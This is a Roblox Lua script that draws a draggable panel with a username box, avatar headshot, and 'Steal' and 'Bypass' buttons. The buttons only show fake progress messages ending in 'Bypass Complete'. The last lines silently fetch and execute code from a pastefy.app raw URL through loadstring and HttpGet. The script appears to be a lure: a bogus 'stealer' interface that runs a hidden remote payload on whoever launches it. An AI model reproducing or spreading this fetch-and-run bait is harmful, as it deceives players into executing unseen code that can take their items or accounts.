local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

-- Create GUI Elements
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AvatarGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Frame (Main UI)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true -- Needed for dragging
frame.Draggable = true -- Simple drag support
frame.Parent = screenGui

-- Resize Handle
local resizeHandle = Instance.new("Frame")
resizeHandle.Size = UDim2.new(0, 20, 0, 20)
resizeHandle.Position = UDim2.new(1, -20, 1, -20)
resizeHandle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
resizeHandle.BorderSizePixel = 0
resizeHandle.Active = true
resizeHandle.Draggable = false
resizeHandle.Parent = frame

-- Drag-to-Resize Logic
resizeHandle.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		local startPos = UserInputService:GetMouseLocation()
		local startSize = frame.Size

		local moveConn
		local releaseConn

		moveConn = UserInputService.InputChanged:Connect(function(moveInput)
			if moveInput.UserInputType == Enum.UserInputType.MouseMovement then
				local delta = UserInputService:GetMouseLocation() - startPos
				frame.Size = UDim2.new(
					startSize.X.Scale,
					math.max(200, startSize.X.Offset + delta.X),
					startSize.Y.Scale,
					math.max(200, startSize.Y.Offset + delta.Y)
				)
			end
		end)

		releaseConn = UserInputService.InputEnded:Connect(function(endInput)
			if endInput.UserInputType == Enum.UserInputType.MouseButton1 then
				moveConn:Disconnect()
				releaseConn:Disconnect()
			end
		end)
	end
end)

-- Title
local title = Instance.new("TextLabel")
title.Text = "Enter username"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.Parent = frame

-- Username Input
local usernameBox = Instance.new("TextBox")
usernameBox.Name = "UsernameBox"
usernameBox.PlaceholderText = "Type Roblox username..."
usernameBox.Size = UDim2.new(1, -20, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 50)
usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameBox.Font = Enum.Font.Gotham
usernameBox.TextSize = 18
usernameBox.ClearTextOnFocus = false
usernameBox.Parent = frame

-- Avatar Image
local avatarImage = Instance.new("ImageLabel")
avatarImage.Name = "AvatarImage"
avatarImage.Size = UDim2.new(0, 100, 0, 100)
avatarImage.Position = UDim2.new(0.5, -50, 0, 100)
avatarImage.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
avatarImage.Parent = frame

-- Red Button (Steal - cosmetic only)
local stealButton = Instance.new("TextButton")
stealButton.Size = UDim2.new(1, -20, 0, 40)
stealButton.Position = UDim2.new(0, 10, 0, 220)
stealButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Font = Enum.Font.GothamBold
stealButton.TextScaled = true
stealButton.Text = "Steal"
stealButton.Parent = frame

-- Green Button (Bypass)
local bypassButton = Instance.new("TextButton")
bypassButton.Size = UDim2.new(1, -20, 0, 40)
bypassButton.Position = UDim2.new(0, 10, 0, 270)
bypassButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Neutral gray
bypassButton.TextColor3 = Color3.fromRGB(255, 255, 255)
bypassButton.Font = Enum.Font.GothamBold
bypassButton.TextScaled = true
bypassButton.Text = "Bypass"
bypassButton.Parent = frame

-- Function: Fetch Avatar
local function updateAvatar(username)
	if username == "" then
		avatarImage.Image = ""
		return
	end
	
	local success, userId = pcall(function()
		return Players:GetUserIdFromNameAsync(username)
	end)
	
	if success and userId then
		local thumbType = Enum.ThumbnailType.HeadShot
		local thumbSize = Enum.ThumbnailSize.Size100x100
		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
		if isReady then
			avatarImage.Image = content
		end
	else
		avatarImage.Image = "" -- Clear if not found
	end
end

-- Detect Username Change
usernameBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		updateAvatar(usernameBox.Text)
	end
end)

-- Bypass Button Logic
bypassButton.MouseButton1Click:Connect(function()
	local username = usernameBox.Text
	if username == "" then return end

	local targetPlayer = Players:FindFirstChild(username)
	if targetPlayer then
		bypassButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0) -- Red
		bypassButton.Text = "Bypassing..."

		task.delay(5, function()
			bypassButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0) -- Green
			bypassButton.Text = "Bypass Complete"
		end)
	else
		bypassButton.BackgroundColor3 = Color3.fromRGB(255, 170, 0) -- Yellow
		bypassButton.Text = "Player Not Found"
		task.delay(1.5, function()
			bypassButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- Gray
			bypassButton.Text = "Bypass"
		end)
	end
end)

-- Run your external loadstring script
local success, err = pcall(function()
	loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
end)
if not success then
	warn("Failed to load external script:", err)
end
